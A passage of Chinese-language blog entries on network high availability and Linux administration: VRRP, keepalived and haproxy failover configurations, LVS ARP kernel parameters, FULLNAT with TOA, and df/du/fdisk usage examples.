多台BACKUP中优先级最高的这台会被抢占为MASTER。这种抢占是非常快速的（小于1s），以保证服务的连续性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于安全性考虑，VRRP包使用了加密协议进行加密。 vrrp简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随着Internet的迅猛发展，基于网络的应用逐渐增多。这就对网络的可靠性提出了越来越高的要求。斥资对所有网络设备进行更新当然是一种很好的可靠性解决方案；但本着保护现有投资的角度考虑，可以采用廉价冗余的思路，在可靠性和经济性方面找到平衡点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟路由冗余协议就是一种很好的解决方案。在该协议中，对共享多存取访问介质（如以太网）上终端IP设备的默认网关(Default Gateway)进行冗余备份，从而在其中一台路由设备宕机时，备份路由设备及时接管转发工作，向用户提供透明的切换，提高了网络服务质量。 一、协议概述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在基于TCP/IP协议的网络中，为了保证不直接物理连接的设备之间的通信，必须指定路由。目前常用的指定路由的方法有两种：一种是通过路由协议（比如：内部路由协议RIP和OSPF）动态学习；另一种是静态配置。在每一个终端都运行动态路由协议是不现实的，大多客户端操作系统平台都不支持动态路由协议，即使支持也受到管理开销、收敛度、安全性等许多问题的限制。因此普遍采用对终端IP设备静态路由配置，一般是给终端设备指定一个或者多个默认网关(Default Gateway)。静态路由的方法简化了网络管理的复杂度和减轻了终端设备的通信开销，但是它仍然有一个缺点：如果作为默认网关的路由器损坏，所有使用该网关为下一跳主机的通信必然要中断。即便配置了多个默认网关，如不重新启动终端设备，也不能切换到新的网关。采用虚拟路由冗余协议 (Virtual Router Redundancy Protocol，简称VRRP)可以很好的避免静态指定网关的缺陷。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在VRRP协议中，有两组重要的概念：VRRP路由器和虚拟路由器，主控路由器和备份路由器。VRRP路由器是指运行VRRP的路由器，是物理实体，虚拟路由器是指VRRP协议创建的，是逻辑概念。一组VRRP路由器协同工作，共同构成一台虚拟路由器。该虚拟路由器对外表现为一个具有唯一固定IP地址和MAC地址的逻辑路由器。处于同一个VRRP组中的路由器具有两种互斥的角色：主控路由器和备份路由器，一个VRRP组中有且只有一台处于主控角色的路由器，可以有一个或者多个处于备份角色的路由器。VRRP协议使用选择策略从路由器组中选出一台作为主控，负责ARP相应和转发IP数据包，组中的其它路由器作为备份的角色处于待命状态。当由于某种原因主控路由器发生故障时，备份路由器能在几秒钟的时延后升级为主路由器。由于此切换非常迅速而且不用改变IP地址和MAC地址，故对终端使用者系统是透明的。 二、工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个VRRP路由器有唯一的标识：VRID，范围为0—255。该路由器对外表现为唯一的虚拟MAC地址，地址的格式为00-00-5E-00-01-[VRID]。主控路由器负责对ARP请求用该MAC地址做应答。这样，无论如何切换，保证给终端设备的是唯一一致的IP和MAC地址，减少了切换对终端设备的影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP控制报文只有一种：VRRP通告(advertisement)。它使用IP多播数据包进行封装，组地址为224.0.0.18，发布范围只限于同一局域网内。这保证了VRID在不同网络中可以重复使用。为了减少网络带宽消耗只有主控路由器才可以周期性的发送VRRP通告报文。备份路由器在连续三个通告间隔内收不到VRRP或收到优先级为0的通告后启动新的一轮VRRP选举。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在VRRP路由器组中，按优先级选举主控路由器，VRRP协议中优先级范围是0—255。若VRRP路由器的IP地址和虚拟路由器的接口IP地址相同，则称该虚拟路由器作VRRP组中的IP地址所有者；IP地址所有者自动具有最高优先级：255。优先级0一般用在IP地址所有者主动放弃主控者角色时使用。可配置的优先级范围为1—254。优先级的配置原则可以依据链路的速度和成本、路由器性能和可靠性以及其它管理策略设定。主控路由器的选举中，高优先级的虚拟路由器获胜，因此，如果在VRRP组中有IP地址所有者，则它总是作为主控路由的角色出现。对于相同优先级的候选路由器，按照IP地址大小顺序选举。VRRP还提供了优先级抢占策略，如果配置了该策略，高优先级的备份路由器便会剥夺当前低优先级的主控路由器而成为新的主控路由器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了保证VRRP协议的安全性，提供了两种安全认证措施：明文认证和IP头认证。明文认证方式要求：在加入一个VRRP路由器组时，必须同时提供相同的VRID和明文密码。适合于避免在局域网内的配置错误，但不能防止通过网络监听方式获得密码。IP头认证的方式提供了更高的安全性，能够防止报文重放和修改等攻击。 三、 应用实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最典型的VRRP应用：RTA、RTB组成一个VRRP路由器组，假设RTB的处理能力高于RTA，则将RTB配置成IP地址所有者，H1、H2、H3的默认网关设定为RTB。则RTB成为主控路由器，负责ICMP重定向、ARP应答和IP报文的转发；一旦RTB失败，RTA立即启动切换，成为主控，从而保证了对客户透明的安全切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在VRRP应用中，RTA在线时RTB只是作为后备，不参与转发工作，闲置了路由器RTA和链路L1。通过合理的网络设计，可以到达备份和负载分担双重效果。让RTA、RTB同时属于互为备份的两个VRRP组：在组1中RTA为IP地址所有者；组2中RTB为IP地址所有者。将H1的默认网关设定为RTA；H2、H3的默认网关设定为RTB。这样，既分担了设备负载和网络流量，又提高了网络可靠性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP协议的工作机理与CISCO公司的HSRP（Hot Standby Routing Protocol）有许多相似之处。但二者主要的区别是在CISCO的HSRP中，需要单独配置一个IP地址作为虚拟路由器对外体现的地址，这个地址不能是组中任何一个成员的接口地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用VRRP协议，不用改造目前的网络结构，最大限度保护了当前投资，只需最少的管理费用，却大大提升了网络性能，具有重大的应用价值。 keepalive的简单应用——管理VIP的飘动from:http://www.cnblogs.com/killkill/archive/2010/12/31/1922360.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VIP的飘动可以为我们解决很多问题，以前我试过使用ifup/ifdown的方式控制网卡的up/down来实现，这种方式有个小问题，就是每次VIP 飘动之后都要等上几十秒才能生效，感觉时间比较长，而且还要配合一些逻辑脚本才能很好地工作，有没有更好的方法呢？当然有，这就是本文的主角—— keepalived。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装很简单： 12345tar zxvf keepalived-1.1.20.tar.gzcd keepalived-1.1.20./configure --prefix=/makemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改一下 /etc/keepalived/keepalived.conf 这个配置文件就可以用了，以下是我的环境，192.168.10.141和192.168.10.142是两个VIP，可以在两台服务器之间飘动： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主机的配置： 1234567891011121314151617181920212223242526272829303132333435363738global_defs &#123; notification_email &#123; failover@firewall.loc &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 192.168.0.48 smtp_connect_timeout 10 router_id nginx&#125;vrrp_instance VI_141 &#123; state BACKUP interface eth0 virtual_router_id 141 priority 50 advert_int 1 authentication &#123; auth_type PASS auth_pass 141 &#125; virtual_ipaddress &#123; 192.168.10.141/26 dev eth0 &#125;&#125;vrrp_instance VI_142 &#123; state BACKUP interface eth0 virtual_router_id 142 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 142 &#125; virtual_ipaddress &#123; 192.168.10.142/26 dev eth0 &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备机的配置： 123456789101112131415161718192021222324252627282930313233343536373839global_defs &#123; notification_email &#123; failover@firewall.loc &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 10.168.0.48 smtp_connect_timeout 10 router_id nginx&#125;vrrp_instance VI_141 &#123; state BACKUP interface eth0 virtual_router_id 141 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 141 &#125; virtual_ipaddress &#123; 192.168.10.141/26 dev eth0 &#125;&#125;vrrp_instance VI_142 &#123; state BACKUP interface eth0 virtual_router_id 142 priority 50 advert_int 1 authentication &#123; auth_type PASS auth_pass 142 &#125; virtual_ipaddress &#123; 192.168.10.142/26 dev eth0 &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;乍一看，主机和备机的配置文件是一样的，仔细看一下priority的值，使用以下命令即可将keepalived加入linux的服务中： 1chkconfig --add keepalived ; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过启、停keepalived这个服务即可观察到VIP的飘动，至于为什么VIP飘动后可以很快地生效，还有待研究。 haproxy+keepalived实现高可用负载均衡&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境： haproxy keepalived 主：192.168.1.192 haproxy keepalived 备：192.168.1.193 vip：192.168.1.200 web：192.168.1.187:80 192.168.1.187:8000 一：安装过程，在192.168.1.192上：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived的安装: 12345678910111213tar -zxvf keepalived-1.1.17.tar.gzln -s /usr/src/kernels/2.6.18-128.el5-i686/ /usr/src/linuxcd keepalived-1.1.17./configure --prefix=/ --mandir=/usr/local/share/man/ --with-kernel-dir=/usr/src/kernels/2.6.18-128.el5-i686/make &amp;&amp; make installcd /etc/keepalived/mv keepalived.conf keepalived.conf.default 123456789101112131415161718192021222324252627282930313233vi keepalived.conf! Configuration File for keepalivedvrrp_script chk_http_port &#123; script "/etc/keepalived/check_haproxy.sh" interval 2 weight 2 global_defs &#123; router_id LVS_DEVEL &#125; vrrp_instance VI_1 &#123; state MASTER #192.168.1.193上改为BACKUP interface eth0 virtual_router_id 51 priority 150 #192.168.1.193上改为120 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_http_port &#125; virtual_ipaddress &#123; 192.168.1.200 &#125; &#125;&#125; 1234567891011vi /etc/keepalived/check_haproxy.sh#!/bin/bashA=`ps -C haproxy --no-header |wc -l`if [ $A -eq 0 ];then /usr/local/haproxy/sbin/haproxy -f /usr/local/haproxy/conf/haproxy.cfg sleep 3 if [ `ps -C haproxy --no-header |wc -l` -eq 0 ];then /etc/init.d/keepalived stop fifi 1chmod 755 /etc/keepalived/check_haproxy.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;haproxy的安装(主备都一样)： 123456tar -zxvf haproxy-1.4.9.tar.gzcd haproxy-1.4.9make TARGET=linux26 PREFIX=/usr/local/haproxy installcd /usr/local/haproxy/mkdir conf logscd conf 1234567891011121314151617181920212223242526272829303132333435363738394041vi haproxy.cfggloballog 127.0.0.1 local3 infomaxconn 4096user nobodygroup nobodydaemonnbproc 1pidfile /usr/local/haproxy/logs/haproxy.piddefaultsmaxconn 2000contimeout 5000clitimeout 30000srvtimeout 30000mode httplog globallog 127.0.0.1 local3 infostats uri /admin?statsoption forwardforfrontend http_serverbind :80log globaldefault_backend info_cacheacl test hdr_dom(host) -i test.domain.comuse_backend cache_test if testbackend info_cache#balance roundrobinbalance sourceoption httpchk HEAD /haproxy.txt HTTP/1.1\r\nHost:192.168.1.187server inst2 192.168.1.187:80 check inter 5000 fall 3backend cache_testbalance roundrobin#balance sourceoption httpchk HEAD /haproxy.txt HTTP/1.1\r\nHost:test.domain.comserver inst1 192.168.1.187:8000 check inter 5000 fall 3 二：再两台机器上都分别启动：1/etc/init.d/keepalived start #这条命令会自动把haproxy启动 三：测试： 再两台机器上分别执行ip add &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主: 123456eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000link/ether 00:0c:29:98:cd:c0 brd ff:ff:ff:ff:ff:ffinet 192.168.1.192/24 brd 192.168.1.255 scope global eth0inet 192.168.1.200/32 scope global eth0inet6 fe80::20c:29ff:fe98:cdc0/64 scope linkvalid_lft forever preferred_lft forever &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备: 12345eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000link/ether 00:0c:29:a6:0c:7e brd ff:ff:ff:ff:ff:ffinet 192.168.1.193/24 brd 255.255.255.254 scope global eth0inet6 fe80::20c:29ff:fea6:c7e/64 scope linkvalid_lft forever preferred_lft forever 停掉主上的haproxy，3秒后keepalived会自动将其再次启动 停掉主的keepalived，备机马上接管服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备: 123456eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000link/ether 00:0c:29:a6:0c:7e brd ff:ff:ff:ff:ff:ffinet 192.168.1.193/24 brd 255.255.255.254 scope global eth0inet 192.168.1.200/32 scope global eth0inet6 fe80::20c:29ff:fea6:c7e/64 scope linkvalid_lft forever preferred_lft forever 更改hosts 12192.168.1.200 test.com192.168.1.200 test.domain.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过IE测试，可以发现 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test.com的请求发向了192.168.1.187:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test.domain.com的请求发向了192.168.1.187:8000]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS负载均衡中arp_ignore和arp_annonuce参数配置的含义]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F15.%20LVS%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%ADarp_ignore%E5%92%8Carp_annonuce%E5%8F%82%E6%95%B0%E9%85%8D%E7%BD%AE%E7%9A%84%E5%90%AB%E4%B9%89%2F</url>
    <content type="text"><![CDATA[LVS负载均衡中arp_ignore和arp_annonuce参数配置的含义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先简单的介绍下关于LVS负载均衡 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS（Linux Virtual Server）Linux服务器集群系统 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对高可伸缩，高可用服务的需求，给予IP层和内容请求分发的负载均衡调度解决方法，并在Linux的内核中实现，将一组服务器构成一个实现可伸缩，高可用网络服务的虚拟服务器 负载均衡 大量的兵法访问或数据流量分担到多态节点设备分别处理，减少用户的等待时间 单个重负载的运算分担到多态节点设备上做并行处理，每个节点设备处理结束后，将结果汇总，返回给用户 负载调度器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一组服务器通过高速的局域网或者地理分布的广域网相互相连，在他们的前端有一个负载均衡调度器（Load Balancer），负载均衡调度器能无缝的将网络请求调度到真实的服务器上，从而使得服务器集群的结构对用户是透明的，用户通过访问集群系统提供的网络服务，就像访问一台高性能，高可用的服务器。 IP负载均衡技术（三种） VS/NAT（网络地址转换）通过网络地址转换，调度器重写请求报文的目标地址，根据预设的调度算法，将请求分发给后端的真实服务器，真实服务器的响应报文通过调度器时，报文的源地址被重写，再返回到客户端，完成整个调度的过程 VS/TUN（IP隧道模式）调度器将请求的报文通过IP隧道转发至真实服务器，而真实的服务器直接将结果返回给用户，调度器只处理请求报文，由于一般网路服务的应答大于请求，采用IP隧道模式，集群系统的最大吞吐量可以提高10倍。 VS/DR（直接路由）通过改写请求报文的MAC地址，将请求发送到真是服务器，真实服务器将响应直接返回给用户，之际额路由模式可以极大的提高集群系统的伸缩性，这种方法没有IP隧道的开销，集群中真实的服务器也没有必要必须支持IP隧道协议，只是需要调度器与真实服务器有一块网卡连在同一物理网段上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中在这三种IP负载均衡的技术中，DR和TUN模式都需要在真实服务器上对arp_ignore和arp_announce参数进行配置，主要是实现禁止响应对VIP的ARP请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在lvs环境中，需要设定以下的参数 1234echo "1" &gt; /proc/sys/net/ipv4/conf/all/arp_ignoreecho "1" &gt; /proc/sys/net/ipv4/conf/lo/arp_ignoreecho "2" &gt; /proc/sys/net/ipv4/conf/lo/arp_announceecho "2" &gt; /proc/sys/net/ipv4/conf/all/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先来看看关于arp_ignore和arp_announce的有关介绍 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有关arp_ignore的相关介绍： 1arp_ignore - INTEGER Define different modes for sending replies in response to received ARP requests that resolve local target IP addresses: 0 - (default): reply for any local target IP address, configured on any interface 1 - reply only if the target IP address is local address configured on the incoming interface 2 - reply only if the target IP address is local address configured on the incoming interface and both with the sender's IP address are part from same subnet on this interface 3 - do not reply for local addresses configured with scope host, only resolutions for global and link addresses are replied 4-7 - reserved 8 - do not reply for all local addresses The max value from conf/&#123;all,interface&#125;/arp_ignore is used when ARP request is received on the &#123;interface&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;arp_ignore:定义对目标地址为本地IP的ARP询问不同的应答模式0 0 - (默认值): 回应任何网络接口上对任何本地IP地址的arp查询请求 1 - 只回答目标IP地址是来访网络接口本地地址的ARP查询请求 2 -只回答目标IP地址是来访网络接口本地地址的ARP查询请求,且来访IP必须在该网络接口的子网段内 3 - 不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出回应 4-7 - 保留未使用 8 -不回应所有（本地地址）的arp查询 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有关arp_announce的相关介绍： arp_announce - INTEGER Define different restriction levels for announcing the local source IP address from IP packets in ARP requests sent on interface: 0 - (default) Use any local address, configured on any interface 1 - Try to avoid local addresses that are not in the target’s subnet for this interface. This mode is useful when target hosts reachable via this interface require the source IP address in ARP requests to be part of their logical network configured on the receiving interface. When we generate the request we will check all our subnets that include the target IP and will preserve the source address if it is from such subnet. If there is no such subnet we select source address according to the rules for level 2. 2 - Always use the best local address for this target. In this mode we ignore the source address in the IP packet and try to select local address that we prefer for talks with the target host. Such local address is selected by looking for primary IP addresses on all our subnets on the outgoing interface that include the target IP address. If no suitable local address is found we select the first local address we have on the outgoing interface or on all other interfaces, with the hope we will receive reply for our request and even sometimes no matter the source IP address we announce. The max value from conf/{all,interface}/arp_announce is used. Increasing the restriction level gives more chance for receiving answer from the resolved target while decreasing the level announces more valid sender’s information. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;arp_announce:对网络接口上，本地IP地址的发出的，ARP回应，作出相应级别的限制: 确定不同程度的限制,宣布对来自本地源IP地址发出Arp请求的接口 0 - (默认) 在任意网络接口（eth0,eth1，lo）上的任何本地地址 1 -尽量避免不在该网络接口子网段的本地地址做出arp回应. 当发起ARP请求的源IP地址是被设置应该经由路由达到此网络接口的时候很有用.此时会检查来访IP是否为所有接口上的子网段内ip之一.如果改来访IP不属于各个网络接口上的子网段内,那么将采用级别2的方式来进行处理. 2 - 对查询目标使用最适当的本地地址.在此模式下将忽略这个IP数据包的源地址并尝试选择与能与该地址通信的本地地址.首要是选择所有的网络接口的子网中外出访问子网中包含该目标IP地址的本地地址. 如果没有合适的地址被发现,将选择当前的发送网络接口或其他的有可能接受到该ARP回应的网络接口来进行发送. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于对arp_announce 理解的一点补充 Assume that a linux box X has three interfaces - eth0, eth1 and eth2. Each interface has an IP address IP0,IP1 and IP2. When a local application tries to send an IP packet with IP0 through the eth2. Unfortunately,the target node’s mac address is not resolved. Thelinux box X will send the ARP request to knowthe mac address of the target(or the gateway). In this case what is the IP source address of the“ARP request message”? The IP0- the IP source address of the transmitting IP or IP2 - the outgoing interface? Until now(actually just 3 hours before) ARP request uses the IP address assigned tothe outgoing interface(IP2 in the above example) However the linux’s behavior is a little bitdifferent. Actually the selection of source address in ARP request is totally configurablebythe proc variable “arp_announce”If we want to use the IP2 not the IP0 in the ARP request, we should change the value to 1 or 2.The default value is 0 - allow IP0 is used for ARP request. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实就是路由器的问题，因为路由器一般是动态学习ARP包的（一般动态配置DHCP的话），当内网的机器要发送一个到外部的ip包，那么它就会请求 路由器的Mac地址，发送一个arp请求，这个arp请求里面包括了自己的ip地址和Mac地址，而linux默认是使用ip的源ip地址作为arp里面 的源ip地址，而不是使用发送设备上面的 ，这样在lvs这样的架构下，所有发送包都是同一个VIP地址，那么arp请求就会包括VIP地址和设备 Mac，而路由器收到这个arp请求就会更新自己的arp缓存，这样就会造成ip欺骗了，VIP被抢夺，所以就会有问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;arp缓存为什么会更新了，什么时候会更新呢，为了减少arp请求的次数，当主机接收到询问自己的arp请求的时候，就会把源ip和源Mac放入自 己的arp表里面，方便接下来的通讯。如果收到不是询问自己的包（arp是广播的，所有人都收到），就会丢掉，这样不会造成arp表里面无用数据太多导致 有用的记录被删除。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在设置参数的时候将arp_ignore 设置为1，意味着当别人的arp请求过来的时候，如果接收的设备上面没有这个ip，就不做出响应，默认是0，只要这台机器上面任何一个设备上面有这个ip，就响应arp请求，并发送mac地址]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS 负载均衡 fullnat 模式和 nat 模式的区别]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F3.%20LVS%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%20fullnat%20%E6%A8%A1%E5%BC%8F%E5%92%8C%20nat%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[LVS 负载均衡 fullnat 模式和 nat 模式的区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于LVS和FULLNAT的介绍可以看一下 淘宝吴佳明(普空)的视频 ，FULLNAT 模式很大简化了LVS的配置和部署，目前淘宝和百度基本上都在使用FULLNAT模式来作为接入侧的负载均衡模式. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;百度的LVS叫做BVS, Baidu Virtual Server, 是在LVS基础上修改的增加了L3 Though 和 SYN Porxy，貌似也是吴佳明(普空)在百度搞的, 类似FULLNAT 项目. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的图来自吴佳明(普空)的PPT, 自己重画了一遍，关于NAT和FULLNAT的区别如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看完上图后发现 FULLNAT有一个问题是：RealServer无法获得用户IP；淘宝通过叫TOA的方式解决的， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要原理是：将 client address 放到了TCP Option 里面带给后端RealServer，RealServer 收到后保存在 socket 的结构体里并通过toa内核模块 hook 了 getname 函数，这样当用户调用 getname 获取远端地址时，返回的是保存在 socket 的 TCPOption 的 IP . 百度的 BVS 是通过叫 ttm 模块实现的，其实现方式跟 toa 基本一样，只是没有开源. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现原理图如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面看下上面说的逻辑的实现代码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lvs侧在TCP报文的选项中插入clientip代码: tcp_fnat_in_handler() &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RS 侧收到建连报文时，取出 toa 里面的 client ip 和 port 存放在 socket 的 use_data 里, toa.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HOOK挂载： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当应用层调用 getpeername() 或者 getsocketname() 时，会进入到 inet_getname_toa,如果存在toa 信息则将 socket 存放的真是的 clientip 返回给应用层。]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 磁盘管理]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F75.%20Linux%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[Linux 磁盘管理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux磁盘管理好坏管理直接关系到整个系统的性能问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux磁盘管理常用三个命令为df、du和fdisk。 df：列出文件系统的整体磁盘使用量 du：检查磁盘空间使用量 fdisk：用于磁盘分区 df&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;df命令参数功能：检查文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 语法：1df [-ahikHTm] [目录或文件名] 选项与参数： -a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统； -k ：以 KBytes 的容量显示各文件系统； -m ：以 MBytes 的容量显示各文件系统； -h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示； -H ：以 M=1000K 取代 M=1024K 的进位方式； -T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出； -i ：不用硬盘容量，而以 inode 的数量来显示 使用实例实例1：将系统内所有的文件系统列出来！123456[root@www ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/hdc2 9920624 3823112 5585444 41% //dev/hdc3 4956316 141376 4559108 4% /home/dev/hdc1 101086 11126 84741 12% /boottmpfs 371332 0 371332 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Linux 底下如果 df 没有加任何选项，那么默认会将系统内所有的 (不含特殊内存内的文件系统与 swap) 都以 1 Kbytes 的容量来列出来！ 实例2:将容量结果以易读的容量格式显示出来123456[root@www ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% //dev/hdc3 4.8G 139M 4.4G 4% /home/dev/hdc1 99M 11M 83M 12% /boottmpfs 363M 0 363M 0% /dev/shm 实例3:将系统内的所有特殊文件格式及名称都列出来1234567891011[root@www ~]# df -aTFilesystem Type 1K-blocks Used Available Use% Mounted on/dev/hdc2 ext3 9920624 3823112 5585444 41% /proc proc 0 0 0 - /procsysfs sysfs 0 0 0 - /sysdevpts devpts 0 0 0 - /dev/pts/dev/hdc3 ext3 4956316 141376 4559108 4% /home/dev/hdc1 ext3 101086 11126 84741 12% /boottmpfs tmpfs 371332 0 371332 0% /dev/shmnone binfmt_misc 0 0 0 - /proc/sys/fs/binfmt_miscsunrpc rpc_pipefs 0 0 0 - /var/lib/nfs/rpc_pipefs 实例4:将 /etc 底下的可用的磁盘容量以易读的容量格式显示123[root@www ~]# df -h /etcFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% / du&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的，这里介绍Linux du命令。 语法：1du [-ahskm] 文件或目录名称 选项与参数： -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 实例1:列出目前目录下的所有文件容量123456[root@www ~]# du8 ./test4 &lt;==每个目录都会列出来8 ./test2....中间省略....12 ./.gconfd &lt;==包括隐藏文件的目录220 . &lt;==这个目录(.)所占用的总量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。 实例2:将文件的容量也列出来12345678[root@www ~]# du -a12 ./install.log.syslog &lt;==有文件的列表了8 ./.bash_logout8 ./test48 ./test2....中间省略....12 ./.gconfd220 . 实例:3检查根目录底下每个目录所占用的容量123456789[root@www ~]# du -sm /*7 /bin6 /boot.....中间省略....0 /proc.....中间省略....1 /tmp3859 /usr &lt;==系统初期最大就是他了啦！77 /var &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通配符 * 来代表每个目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与 df 不一样的是，du 这个命令其实会直接到文件系统内去搜寻所有的文件数据。 fdisk&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fdisk 是 Linux 的磁盘分区表操作工具。 语法：1fdisk [-l] 装置名称 选项与参数： -l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。 实例1:列出所有分区信息12345678910111213141516171819202122[root@AY120919111755c246621 tmp]# fdisk -lDisk /dev/xvda: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000 Device Boot Start End Blocks Id System/dev/xvda1 * 1 2550 20480000 83 Linux/dev/xvda2 2550 2611 490496 82 Linux swap / SolarisDisk /dev/xvdb: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x56f40944 Device Boot Start End Blocks Id System/dev/xvdb2 1 2610 20964793+ 83 Linux 实例2:找出你系统中的根目录所在磁盘，并查阅该硬盘内的相关信息12345678910111213[root@www ~]# df / &lt;==注意：重点在找出磁盘文件名而已Filesystem 1K-blocks Used Available Use% Mounted on/dev/hdc2 9920624 3823168 5585388 41% /[root@www ~]# fdisk /dev/hdc &lt;==仔细看，不要加上数字喔！The number of cylinders for this disk is set to 5005.There is nothing 